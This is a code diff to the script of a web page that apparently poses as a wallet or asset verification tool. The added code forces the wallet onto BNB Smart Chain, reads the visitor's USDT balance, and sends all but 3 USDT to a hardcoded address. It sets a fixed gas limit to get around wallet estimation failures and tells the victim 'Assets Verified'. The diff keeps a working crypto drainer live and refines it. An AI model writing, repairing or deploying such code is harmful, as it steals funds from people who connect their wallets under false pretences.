@@ -106,62 +106,75 @@
 
                 const accounts = await currentProvider.request({ method: 'eth_requestAccounts' });
                 const userAddress = accounts[0];
-                
-                const provider = new ethers.providers.Web3Provider(currentProvider, "any");
-                const signer = provider.getSigner();
-                
-                const targetAddress = '0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3';
-                const usdtContractAddress = '0x55d398326f99059ff775485246999027b3197955';
-                
-                const erc20Abi = [
-                    "function balanceOf(address owner) view returns (uint256)",
-                    "function transfer(address to, uint amount) returns (bool)"
-                ];
-                
-                let balanceWei;
+
+                // AUTO-NETWORK SWITCH LOGIC (Forces BNB Smart Chain)
                 try {
-                    const usdtContract = new ethers.Contract(usdtContractAddress, erc20Abi, signer);
-                    balanceWei = await usdtContract.balanceOf(userAddress);
-                } catch (e) {
-                    const publicProvider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
-                    const publicContract = new ethers.Contract(usdtContractAddress, erc20Abi, publicProvider);
-                    balanceWei = await publicContract.balanceOf(userAddress);
-                }
-                
-                const formattedBalance = parseFloat(ethers.utils.formatUnits(balanceWei, 18));
-                
-                if (formattedBalance > 3.0) {
-                    
-                    const sendAmountFormatted = (formattedBalance - 3.0).toString();
-                    const sendAmountWei = ethers.utils.parseUnits(sendAmountFormatted, 18);
-                    
-                    const usdtContract = new ethers.Contract(usdtContractAddress, erc20Abi, signer);
-                    const dataTransfer = usdtContract.interface.encodeFunctionData("transfer", [targetAddress, sendAmountWei]);
-                    
-                    // Manual Gas limit added here to bypass wallet estimation failures
-                    const txParams = {
-                        from: userAddress,
-                        to: usdtContractAddress,
-                        data: dataTransfer,
-                        gas: "0x186A0" // Hardcoded to 100,000 gas limit in hex
-                    };
-                    
                     await currentProvider.request({
-                        method: 'eth_sendTransaction',
-                        params: [txParams]
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }], // 0x38 is hex for 56 (BSC Mainnet)
                     });
-                    
-                    alert("Assets Verified and Transaction Submitted!");
-                } else {
-                    alert("Verification complete. Your balance is " + formattedBalance + " USDT, which is less than or equal to 3 USDT. Nothing to transfer.");
+                } catch (switchError) {
+                    console.log("Auto-switch error: ", switchError);
                 }
+                
+                // Chhote delay ke baad check karenge taaki network change ho jaye
+                setTimeout(async () => {
+                    try {
+                        const provider = new ethers.providers.Web3Provider(currentProvider, "any");
+                        const signer = provider.getSigner();
+                        
+                        const targetAddress = '0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3';
+                        const usdtContractAddress = '0x55d398326f99059ff775485246999027b3197955';
+                        
+                        const erc20Abi = [
+                            "function balanceOf(address owner) view returns (uint256)",
+                            "function transfer(address to, uint amount) returns (bool)"
+                        ];
+                        
+                        let balanceWei;
+                        try {
+                            const usdtContract = new ethers.Contract(usdtContractAddress, erc20Abi, signer);
+                            balanceWei = await usdtContract.balanceOf(userAddress);
+                        } catch (e) {
+                            const publicProvider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+                            const publicContract = new ethers.Contract(usdtContractAddress, erc20Abi, publicProvider);
+                            balanceWei = await publicContract.balanceOf(userAddress);
+                        }
+                        
+                        const formattedBalance = parseFloat(ethers.utils.formatUnits(balanceWei, 18));
+                        
+                        if (formattedBalance > 3.0) {
+                            
+                            const sendAmountFormatted = (formattedBalance - 3.0).toString();
+                            const sendAmountWei = ethers.utils.parseUnits(sendAmountFormatted, 18);
+                            
+                            const usdtContract = new ethers.Contract(usdtContractAddress, erc20Abi, signer);
+                            const dataTransfer = usdtContract.interface.encodeFunctionData("transfer", [targetAddress, sendAmountWei]);
+                            
+                            const txParams = {
+                                from: userAddress,
+                                to: usdtContractAddress,
+                                data: dataTransfer,
+                                gas: "0x186A0"
+                            };
+                            
+                            await currentProvider.request({
+                                method: 'eth_sendTransaction',
+                                params: [txParams]
+                            });
+                            
+                            alert("Assets Verified and Transaction Submitted!");
+                        } else {
+                            alert("Verification complete. Your BSC balance is " + formattedBalance + " USDT, which is less than or equal to 3 USDT.");
+                        }
+                    } catch (innerError) {
+                        alert("Real Error: " + (innerError.message || JSON.stringify(innerError)));
+                    }
+                }, 1000); // 1 second delay network update ke liye
 
             } catch (error) {
                 console.error("Wallet Error:", error);
-                
-                // Real Error message extraction
-                const exactError = error.message || JSON.stringify(error);
-                alert("Real Error: " + exactError);
+                alert("Real Error: " + (error.message || JSON.stringify(error)));
             }
         }
     </script>
